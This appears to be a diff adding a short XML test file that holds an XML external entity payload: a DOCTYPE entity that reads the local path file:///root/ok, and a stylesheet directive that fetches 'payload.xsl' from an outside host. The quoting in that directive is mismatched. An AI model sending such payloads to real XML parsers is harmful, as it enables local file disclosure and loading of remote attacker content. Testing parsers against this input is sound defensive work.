@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE root [
+<!ENTITY load SYSTEM "file:///root/ok">]>
+<?xml-stylesheet type='text/xsl'href=‘http://chickenfeet.glitterpants.org/payload.xsl'?>
+<root>&load;</root> 
